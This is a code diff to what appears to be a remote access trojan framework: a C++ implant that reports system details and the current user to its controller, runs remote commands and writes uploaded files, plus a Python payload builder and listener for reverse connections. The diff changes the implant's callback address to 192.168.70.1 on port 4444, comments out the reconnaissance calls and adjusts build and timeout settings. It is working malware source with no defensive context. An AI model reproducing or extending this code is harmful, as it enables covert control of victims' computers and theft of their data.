@@ -109,9 +109,9 @@ RAT::RAT()
     memset(Buffer, 0, sizeof(Buffer));
     char PipeRel[2048];
     char whoami[1024];
-    PipeCmd((char *)\"powershell -c \\\"Get-WmiObject Win32_OperatingSystem | Format-List BootDevice, BuildNumber, BuildType, Caption, CodeSet, CountryCode, CreationClassName, CSCreationClassName, CSDVersion, CSName, Description, Locale, Manufacturer, Name, Organization, OSArchitecture, OtherTypeDescription, PlusProductID, PlusVersionNumber, RegisteredUser, SerialNumber, Status, SystemDevice, SystemDirectory, SystemDrive, Version, WindowsDirectory\\\"\", PipeRel, 2048);
-    PipeCmd((char*)\"whoami\", whoami, 1024);
-    
+    //PipeCmd((char *)\"powershell -c \\\"Get-WmiObject Win32_OperatingSystem | Format-List BootDevice, BuildNumber, BuildType, Caption, CodeSet, CountryCode, CreationClassName, CSCreationClassName, CSDVersion, CSName, Description, Locale, Manufacturer, Name, Organization, OSArchitecture, OtherTypeDescription, PlusProductID, PlusVersionNumber, RegisteredUser, SerialNumber, Status, SystemDevice, SystemDirectory, SystemDrive, Version, WindowsDirectory\\\"\", PipeRel, 2048);
+    //PipeCmd((char*)\"whoami\", whoami, 1024);
+
     sprintf(Buffer,\"========================================System==========================\\n%s\\n=================Whoami==============================\\nwhoami%s\\n========================================\", PipeRel, whoami);
     Send(0x0, Buffer, strlen(Buffer));
     memset(Buffer, 0, sizeof(Buffer));
@@ -129,7 +129,7 @@ RAT::RAT()
         }
         else if (Ret.Command == SPIRITER_EXEC) {
             ExecCode(Ret);
-
+            continue;
         }
         else if (Ret.Command == SPIRITER_UPLOAD) {
             WriteFileA(Ret);
@@ -311,7 +311,6 @@ BOOL RAT::PipeCmd(char* pszCmd, char* pszResultBuffer, DWORD dwResultBufferSize)
     bRet = ::CreateProcessA(NULL, pszCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
     if (FALSE == bRet)
     {
-        printf(\"%d\\n\", GetLastError());
         printf(\"Error\");
     }
     ::WaitForSingleObject(pi.hThread, INFINITE);
@@ -722,7 +721,7 @@ class Payloads(Payload):
             ("LocalHost", "0.0.0.0", True, 'Local listen Address'),
             ("LocalPort", "4444", True, 'Local listen port'),
             ("Port", "4444", True, ' The puppet machine is connected to the port'),
-            ("RemoteHost", "127.0.0.1", True, 'The puppet machine connects to the address'),
+            ("RemoteHost", "192.168.70.1", True, 'The puppet machine connects to the address'),
         )
     }
     Support=True
@@ -802,14 +801,14 @@ class Payloads(Payload):
             Object.Filename=self.File
         
         Object.CppCmakeLists+="""
-target_link_libraries(%s wsock32 ws2_32)
-
-target_link_libraries(%s shlwapi shlwapi)
-
+target_link_options({0} PUBLIC "LINKER:-Bdynamic")
+target_link_libraries({0} wsock32 ws2_32)
+target_link_libraries({0} shlwapi shlwapi)
+target_link_options({0} PUBLIC "LINKER:-Bstatic")
 if(CMAKE_BUILD_TOOL MATCHES "(msdev|devenv|nmake)")
     add_definitions(/W0)
 endif()
-        """%(Object.Filename,Object.Filename)    
+        """.format(Object.Filename)    
         if(self.Type=="exe"):
             Codes+=EXE
             Object.Types="exe"
@@ -902,7 +901,7 @@ class ListenWaiter(threading.Thread):
     def TrySession(self,Sock):
         self.setRdi()
         TryDatxa=b""
-        Sock.settimeout(3)
+        Sock.settimeout(5)
         try:
             TryData=Sock.recv(4096+28)
         except:
@@ -940,7 +939,7 @@ class ListenWaiter(threading.Thread):
                     make_data = data[i*1460:]
                 SpiriterData=make_data
             except Exception as e:
-                print(e)   
+                print_error(e.__str__())   
             Socket.sendall(SpiriterData)
     def run(self):  #
         while True:
